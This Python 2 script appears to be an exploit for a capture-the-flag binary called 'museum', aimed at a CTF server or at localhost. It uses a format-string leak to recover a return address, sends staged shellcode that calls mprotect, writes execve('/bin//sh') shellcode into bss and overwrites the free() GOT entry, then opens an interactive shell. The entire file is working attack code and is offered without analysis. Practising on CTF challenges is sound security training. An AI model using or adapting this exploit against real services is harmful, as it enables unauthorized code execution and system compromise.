import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

# Adjust stack and jump to fgets() to upload next shellcode
sc1 = "\xc6\x44\x24\x08\xff\x66\x83\x2c\x24\x22\xc3"
'''
08048098 <_start>:
 8048098:	c6 44 24 08 ff       	mov    BYTE PTR [esp+0x8],0xff
 804809d:	66 83 2c 24 22       	sub    WORD PTR [esp],0x22
 80480a2:	c3                   	ret    
'''

# Execute mprotect() to change permission in bss, set shellcode in bss, overwrite free() got, and return to museum()
sc2 = "\x50\x8d\x42\x7d\xbb\x00\xb0\x04\x08\xb9\x00\x10\x00\x00\x8d\x52\x07\xcd\x80\xc7\x05\x00\xb1\x04\x08\x31\xd2\x52\x68\xc7\x05\x04\xb1\x04\x08\x2f\x2f\x73\x68\xc7\x05\x08\xb1\x04\x08\x68\x2f\x62\x69\xc7\x05\x0c\xb1\x04\x08\x6e\x89\xe3\x52\xc7\x05\x10\xb1\x04\x08\x53\x89\xe1\x8d\xc7\x05\x14\xb1\x04\x08\x42\x0b\xcd\x80\xc7\x05\x1c\xb0\x04\x08\x00\xb1\x04\x08\x58\x8b\x40\x61\x89\x04\x24\xc3"

'''
08048098 <_start>:
 8048098:	50                   	push   eax
 8048099:	8d 42 7d             	lea    eax,[edx+0x7d]
 804809c:	bb 00 b0 04 08       	mov    ebx,0x804b000
 80480a1:	b9 00 10 00 00       	mov    ecx,0x1000
 80480a6:	8d 52 07             	lea    edx,[edx+0x7]
 80480a9:	cd 80                	int    0x80
 80480ab:	c7 05 00 b1 04 08 31 	mov    DWORD PTR ds:0x804b100,0x6852d231
 80480b2:	d2 52 68 
 80480b5:	c7 05 04 b1 04 08 2f 	mov    DWORD PTR ds:0x804b104,0x68732f2f
 80480bc:	2f 73 68 
 80480bf:	c7 05 08 b1 04 08 68 	mov    DWORD PTR ds:0x804b108,0x69622f68
 80480c6:	2f 62 69 
 80480c9:	c7 05 0c b1 04 08 6e 	mov    DWORD PTR ds:0x804b10c,0x52e3896e
 80480d0:	89 e3 52 
 80480d3:	c7 05 10 b1 04 08 53 	mov    DWORD PTR ds:0x804b110,0x8de18953
 80480da:	89 e1 8d 
 80480dd:	c7 05 14 b1 04 08 42 	mov    DWORD PTR ds:0x804b114,0x80cd0b42
 80480e4:	0b cd 80 
 80480e7:	c7 05 1c b0 04 08 00 	mov    DWORD PTR ds:0x804b01c,0x804b100
 80480ee:	b1 04 08 
 80480f1:	58                   	pop    eax
 80480f2:	8b 40 61             	mov    eax,DWORD PTR [eax+0x61]
 80480f5:	89 04 24             	mov    DWORD PTR [esp],eax
 80480f8:	c3                   	ret    

'''

museum_bss = 0x804b100

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("museum.ctfq.maguro.run", 10007)
        # leak return addr
        read_until(f,">>")
        f.write("03 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n")
        read_until(f,"0x1(nil)(nil)(nil)(nil)(nil)0x1(nil)")
        ret = int(f.read(10),16)
        print ret

        # execute crafted shellcode
        read_until(f,">>")
        f.write("04 1111\n")
        read_until(f,"16")
        f.write(sc1+"\n")
        f.write(sc2+p(ret)+"\n")

        shell(s)          

    else:
        s, f = sock("localhost", 10007)
        # leak return addr
        read_until(f,">>")
        f.write("04 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n")
        read_until(f,"0x1(nil)(nil)(nil)(nil)(nil)0x1(nil)")
        ret = int(f.read(10),16)
        #print ret

        # execute crafted shellcode
        read_until(f,">>")
        f.write("03 1111\n")
        read_until(f,"16")
        f.write(sc1+"\n")
        f.write(sc2+p(ret)+"\n")

        shell(s)          
